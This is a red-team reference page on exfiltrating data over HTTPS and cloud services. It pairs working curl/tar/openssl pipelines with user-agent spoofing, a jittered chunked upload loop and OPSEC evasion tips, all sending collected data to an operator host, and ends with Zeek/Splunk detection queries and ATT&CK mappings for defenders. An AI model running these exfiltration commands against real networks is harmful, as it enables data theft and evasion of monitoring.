---
title: "HTTPS & Cloud Exfil"
parent: "2. Data Transfer"
nav_order: 4
---

# HTTPS & Cloud-Service Exfiltration

*Blending data exfiltration into routine web and SaaS traffic - TLS hides the payload from content inspection, but metadata, volume, and destination reputation still betray it.*

Related: [Exfil principles](01-exfil-principles-and-staging.md) |
[Encoding & encryption](02-encoding-compression-encryption.md) |
[Out-of-band & throttling](06-out-of-band-and-throttling.md) |
[C2 redirectors](../c2-infrastructure/01-redirectors-and-domain-fronting.md)

## What & why

HTTPS is the most natural egress channel on almost any host: it is port 443, it uses TLS so the
body is opaque to inline inspection without a decrypting proxy, and destinations can be made to
look like normal web services. The OPSEC argument is metadata and reputation blending - making
the transfer look indistinguishable from ordinary user web traffic. The critical limitation is
that TLS hides the payload but not the conversation: the destination IP, the SNI hostname, the
JA3/JA4 TLS fingerprint, the certificate, the timing, and the volume are all visible to anyone
watching the wire.

## Technique

### Direct POST to an operator endpoint

The simplest channel: compress, encrypt, POST to a host you control.

```bash
# compress + encrypt in memory, POST to operator endpoint
tar -czf - /tmp/collected/ \
  | openssl enc -aes-256-cbc -pbkdf2 -pass pass:LAB_ONLY \
  | curl -s -X POST \
      -H "Content-Type: application/octet-stream" \
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
      --data-binary @- \
      https://203.0.113.10/api/v2/sync
```

The operator endpoint should be behind a domain with a valid certificate, a believable cover
page on the root path, and a categorization that matches expected traffic for the target org.
See [C2 redirectors](../c2-infrastructure/01-redirectors-and-domain-fronting.md).

### Blending into SaaS / authorized cloud services

Many enterprise environments allowlist well-known SaaS destinations by IP range or domain.
An upload to a service already on the allowlist avoids destination-reputation alerts. In an
authorized engagement this means:

- Cloud object storage (public bucket upload via the API)
- Code repository hosting (git push or raw file upload)
- Collaboration platform webhooks (POST to a webhook URL)
- Document sharing services (file upload API)

Frame this as conceptual - specific API endpoints change. The principle is: if the destination
domain is in the proxy allowlist and the traffic volume is plausible, the content alert becomes
the primary detection path, which is removed by encryption.

```bash
# generic curl POST to an authorized SaaS API (replace with actual authorized service URL)
tar -czf - /tmp/collected/ \
  | age -r age1ql3z7hjy... \
  | curl -s -X PUT \
      -H "Authorization: Bearer LAB_TOKEN" \
      -H "Content-Type: application/octet-stream" \
      --data-binary @- \
      "https://api.example.com/v1/objects/$(hostname)-$(date +%s).bin"
```

### Mimicking a legitimate API client

EDR and UEBA correlate the User-Agent, TLS fingerprint, certificate, and request pattern. A
raw `curl` request to an unusual endpoint with the default `curl/X.Y.Z` User-Agent is a weak
signal but still visible.

```bash
# override UA, add realistic headers
curl -s -X POST \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @blob.enc \
  https://203.0.113.10/api/upload
```

Note: User-Agent string alone does not change the TLS JA3/JA4 fingerprint - the cipher suite
negotiation is determined by the TLS library (`curl` uses libssl), not the UA header.

### Chunked uploads to stay under DLP size thresholds

```bash
# split into 5 MB chunks, upload each with a delay
for chunk in /dev/shm/chunk_*; do
  curl -s -X POST --data-binary @"$chunk" https://203.0.113.10/chunk
  sleep $((RANDOM % 30 + 10))
done
```

The sleep adds jitter. Fixed-interval uploads create a beaconing pattern that periodicity
analytics catch.

### Checking for TLS inspection proxies

Enterprise proxies that perform TLS inspection present their own certificate to the client.
The CA will be an internal corporate CA, not a public one.

```bash
# check the presented TLS certificate chain
curl -sv https://example.com 2>&1 | grep -E "issuer|subject|CN="

# openssl equivalent
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -issuer -subject
```

If the issuer is a corporate CA (e.g. `CN=CorpCA`, `O=Internal`), the proxy decrypts and
re-encrypts all HTTPS traffic. Your payload is visible in plaintext to the proxy. In this case,
encryption of the payload becomes mandatory rather than optional, and the content-match
detection surface expands dramatically.

## OPSEC notes

- A newly-registered or low-reputation destination domain is the single strongest indicator.
  Domain age, passive DNS history, and threat-intel reputation feeds all feed into this signal.
  Use aged, categorized domains with valid certificates.
- The JA3/JA4 TLS fingerprint of `curl` is widely catalogued and distinguishable from browser
  traffic. If the target environment fingerprints TLS clients, `curl` is a tell. Tools built on
  Go's `crypto/tls` or Python's `ssl` module have distinct fingerprints too.
- Upload volume asymmetry is logged by NetFlow even when TLS is in use. Bytes-out >> bytes-in
  on a connection is a clear asymmetry flag.
- CASB (Cloud Access Security Broker) tools see all SaaS traffic and can correlate the user
  identity with the upload destination and volume. Uploading 50 MB to a personal storage
  account from a corporate identity triggers DLP alerts in most CASB configurations.
- Beaconing / fixed-interval transfers are caught by autocorrelation analytics regardless of
  the protocol. Add jitter (see [throttling page](06-out-of-band-and-throttling.md)).
- SNI is visible in TLS ClientHello even when the certificate is valid. The destination
  hostname is not hidden by TLS.

## Detection & telemetry

### TLS metadata signals

| Signal | Source | Detail |
|---|---|---|
| Newly-registered / low-reputation SNI | Proxy logs, Zeek ssl.log, threat intel | Domain age < 30 days, or unknown in passive DNS |
| JA3/JA4 TLS fingerprint mismatch | Zeek ssl.log, Suricata, EDR network | `curl`, Python, Go TLS stacks have known fingerprints |
| Self-signed or unusual CA in certificate | Zeek x509.log | `certificate.issuer` does not match expected public CAs |
| Certificate age < 7 days | Zeek x509.log | Let's Encrypt auto-issuance for new operator infra |

**Zeek ssl.log hunt for anomalous TLS clients:**

```zeek
# In Splunk against Zeek ssl.log
index=zeek sourcetype=zeek_ssl
| stats count by ja3, server_name
| where count < 5
| sort - count
```

### Volume and timing signals

| Signal | Source | Detail |
|---|---|---|
| Upload volume asymmetry | NetFlow/IPFIX | `bytes_out / bytes_in > 10` on a single session |
| Large single POST | Proxy logs | Request body > DLP threshold (commonly 10 MB) |
| Regular-interval requests | NetFlow, proxy | Autocorrelation of connection timestamps |
| Destination not in baseline | UEBA | Host never connected to this domain before |

**Splunk - upload asymmetry in proxy logs:**

```spl
index=proxy
| eval ratio=cs_bytes / sc_bytes
| where ratio > 20 AND cs_bytes > 1000000
| stats sum(cs_bytes) as total_upload by src_ip, cs_host
| sort - total_upload
```

### CASB / DLP signals

| Signal | Source | Detail |
|---|---|---|
| User upload to personal SaaS | CASB | Alert: corporate identity uploads to personal-tier account |
| Encrypted blob in POST | DLP (inline) | High-entropy content in POST body after TLS decryption |
| Anomalous SaaS category | CASB | Upload to storage/code/file-sharing from a server workload |

## MITRE ATT&CK

- **T1048** - Exfiltration Over Alternative Protocol
- **T1048.002** - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- **T1567** - Exfiltration Over Web Service
- **T1567.002** - Exfiltration Over Web Service: Exfiltration to Cloud Storage
- **T1071.001** - Application Layer Protocol: Web Protocols (C2 over HTTP/S)

## References

- MITRE ATT&CK T1567 Exfiltration Over Web Service: https://attack.mitre.org/techniques/T1567/
- MITRE ATT&CK T1048 Exfiltration Over Alternative Protocol: https://attack.mitre.org/techniques/T1048/
- JA3/JA4 TLS fingerprinting: https://github.com/salesforce/ja3 and https://github.com/FoxIO-LLC/ja4
- Zeek ssl.log reference: https://docs.zeek.org/en/master/logs/ssl.html
- SANS whitepaper on data exfiltration detection: https://www.sans.org/white-papers/
- Corelight TLS visibility blog series: https://corelight.com/blog/
